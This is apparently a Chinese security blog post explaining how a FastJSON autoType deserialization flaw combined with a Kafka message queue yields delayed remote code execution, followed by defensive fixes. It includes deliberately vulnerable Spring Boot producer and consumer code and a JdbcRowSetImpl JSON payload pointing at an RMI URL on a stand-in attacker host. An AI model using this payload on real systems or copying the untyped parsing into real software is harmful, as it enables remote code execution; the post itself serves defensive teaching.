#  FastJSON + MQ 实现反序列化漏洞攻击链   
原创 火力猫  季升安全   2025-04-24 15:21  
  
# 🚨 利用 FastJSON + MQ 实现反序列化漏洞攻击链  
  
在现代微服务架构中，消息中间件（如 Kafka、RocketMQ、RabbitMQ）被广泛用于服务解耦与异步通信。然而，这也带来了新的攻击面，尤其是当与 FastJSON 等存在反序列化风险的 JSON 解析库结合时，可能形成一种 **延迟触发型反序列化漏洞**  
。  
  
本文将详细分析攻击链的构造方式，说明漏洞触发点、利用方式，并提供修复建议。  
## 🧩 一、攻击场景  
  
常见的 Spring Boot + Kafka + FastJSON 场景：  
#### ✉️ 生产者端代码  
```
@PostMapping("/send")publicvoidsendPayload(@RequestParam String payload){    Object data = JSON.parse(payload); // FastJSON 反序列化    kafkaTemplate.send("vuln-topic", data);}
```  
#### 📬 消费者端代码  
```
@KafkaListener(topics = "vuln-topic")publicvoidonMessage(Object msg){    System.out.println("接收数据: " + msg.toString());}
```  
## 🔍 二、漏洞分析  
#### ✅ 漏洞触发点  
- JSON.parse(payload)  
 是 **FastJSON 的反序列化入口**  
。  
  
- 如果传入的 JSON 字符串中包含 @type  
 字段，FastJSON 会根据类型实例化指定类。  
  
#### ❓ 为什么消费端也有风险？  
  
即使生产端 parse 后没触发异常，但消息体中保存的是“有毒”的对象。只要消费端调用：  
- .toString()  
  
- .equals()  
  
- .hashCode()  
  
- 或使用对象中的属性  
  
就可能触发类中的恶意逻辑（比如构造方法、getter 方法）从而实现 **远程代码执行（RCE）**  
。  
#### 💣 如果传入JdbcRowSetImpl  
```
{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "rmi://attacker.com/Exploit","autoCommit": true}
```  
  
该类会在实例化时触发 RMI 连接，进而加载并执行远程类 —— 实现 RCE！  
  
**如果对为何在消费端才触发有疑问**  
 👉 [渗透测试 FastJSON 是个“延时炸弹” ？](https://mp.weixin.qq.com/s?__biz=MzkxNjY5MDc4Ng==&mid=2247484914&idx=1&sn=f2d2d2b949b35cbeb0118017eeb0f897&scene=21#wechat_redirect)  
  
  
## 🔗 三、攻击链流程  
```
[Attacker] → POST /send?payload=恶意JSON         ↓FastJSON.parse(payload)  ← 触发点1         ↓KafkaTemplate.send("vuln-topic", Object) /*反序列化对象写入 Kafka Topic */         ↓KafkaListener 收到消息         ↓msg.toString() → 恶意对象触发构造逻辑（RCE） ← 触发点2
```  
## 🛠️ 四、防御方案  
#### ✅ 1. 禁用 autoType  
```
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
```  
#### ✅ 2. 启用白名单  
```
ParserConfig.getGlobalInstance().addAccept("com.safe.model.");
```  
#### ✅ 3. 避免使用 Object 类型  
```
UserDTO dto = JSON.parseObject(payload, UserDTO.class);
```  
#### ✅ 4. 升级 FastJSON 至最新版（推荐 >1.2.83）  
  
新版 FastJSON 已修复多数 autoType 漏洞，默认禁用。  
#### ✅ 5. MQ 消费端增加类型校验  
- 消费端接收到消息后，先验证对象是否属于预期类型  
  
- 拒绝处理未知或不受信任的数据结构  
  
## 📌 五、总结  
>   
> FastJSON 的 autoType 功能虽然强大，却也带来了潜在的高危反序列化风险。结合 MQ 后，漏洞链条具备了“异步、延迟、跨系统”触发的特点，危险性更高。  
  
  
<table><thead><tr><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">建议</span></section></th><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">明确指定反序列化目标类</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">不使用 </span><code><span leaf="">Object</span></code></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">拒绝外部 </span><code><span leaf="">@type</span></code><span leaf=""> 字段</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">使用安全配置屏蔽类型猜测</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">设置 FastJSON 安全配置项</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">启用白名单、防止自动加载类</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">加强 MQ 消费端安全审计</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">对消息结构进行白名单校验</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">配合安全扫描工具审查代码</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">如 Semgrep、SonarQube 等</span></section></td></tr></tbody></table>  
  
  
  
